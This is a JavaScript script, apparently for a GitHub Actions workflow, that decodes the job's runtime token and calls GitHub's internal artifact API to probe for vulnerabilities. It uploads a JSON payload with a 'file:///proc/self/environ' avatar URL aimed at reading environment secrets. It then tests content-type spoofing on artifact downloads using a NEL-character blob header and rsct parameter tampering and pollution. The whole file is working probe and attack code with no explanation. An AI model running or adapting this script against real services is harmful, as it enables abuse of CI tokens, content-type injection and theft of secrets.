module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  if (!runtimeToken || !resultsUrl) throw new Error('Actions runtime variables unavailable');
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');
  const base = new URL(resultsUrl).origin;
  const ids = {workflow_run_backend_id: workflowRunBackendId, workflow_job_run_backend_id: workflowJobRunBackendId};
  const service = 'github.actions.results.api.v1.ArtifactService';
  const candidates = [['normal-json', 7, 'application/json']];

  async function twirp(method, body) {
    const response = await fetch(`${base}/twirp/${service}/${method}`, {
      method: 'POST',
      headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(body),
    });
    return [response.status, await response.json()];
  }

  for (const [label, version, mime] of candidates) {
    const name = `${label}.json`;
    const [createStatus, created] = await twirp('CreateArtifact', {...ids, name, version, mime_type: mime});
    if (createStatus !== 200 || !created.ok) {
      console.log(`${label}: Create HTTP ${createStatus}; code=${created.code || 'unknown'}; message=${created.msg || ''}`);
      continue;
    }
    const signedUploadUrl = created.signed_upload_url || created.signedUploadUrl;
    const body = Buffer.from('{"full_name":"x/y","owner":{"avatar_url":"file:///proc/self/environ"}}');
    const put = await fetch(signedUploadUrl, {
      method: 'PUT',
      headers: {'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05', 'x-ms-blob-type': 'BlockBlob'},
      body,
    });
    if (!put.ok) {
      console.log(`${label}: PUT HTTP ${put.status}; azure-code=${put.headers.get('x-ms-error-code')}`);
      continue;
    }
    const [finalStatus, finalized] = await twirp('FinalizeArtifact', {...ids, name, size: String(body.length)});
    if (finalStatus !== 200 || !finalized.ok) {
      console.log(`${label}: Finalize HTTP ${finalStatus}; code=${finalized.code || 'unknown'}; message=${finalized.msg || ''}`);
      continue;
    }
    const id = String(finalized.artifact_id || finalized.artifactId);
    if (label === 'normal-json') {
      try {
        const changed = await fetch(signedUploadUrl, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/octet-stream',
            'x-ms-version': '2025-01-05',
            'x-ms-blob-type': 'BlockBlob',
            'x-ms-blob-content-type': 'application/json\u0085',
          },
          body,
        });
        console.log(`azure-nel-property: HTTP ${changed.status}; code=${changed.headers.get('x-ms-error-code')}`);
      } catch (error) {
        console.log(`azure-nel-property: client error ${error.message}`);
      }
    }
    const url = `https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`;
    const first = await fetch(url, {redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'}});
    const location = first.headers.get('location');
    let rawStatus = '?', rawType = '?', rsct = '?';
    if (location) {
      rsct = new URL(location).searchParams.get('rsct');
      const raw = await fetch(location);
      rawStatus = raw.status;
      rawType = raw.headers.get('content-type');
    }
    console.log(`${label}: ID=${id}; GitHub=${first.status}; rsct=${JSON.stringify(rsct)}; raw=${rawStatus}; Content-Type=${JSON.stringify(rawType)}`);

    if (label === 'normal-json') {
      const varied = await fetch(`${url}?rsct=application%2Fjson%85`, {redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'}});
      const variedLocation = varied.headers.get('location');
      console.log(`query-rsct: status=${varied.status}; rsct=${JSON.stringify(variedLocation && new URL(variedLocation).searchParams.get('rsct'))}`);
      if (location) {
        const polluted = new URL(location);
        polluted.searchParams.append('rsct', 'application/json\u0085');
        const test = await fetch(polluted.href);
        console.log(`duplicate-rsct: status=${test.status}; Content-Type=${JSON.stringify(test.headers.get('content-type'))}`);
      }
    }
  }
};
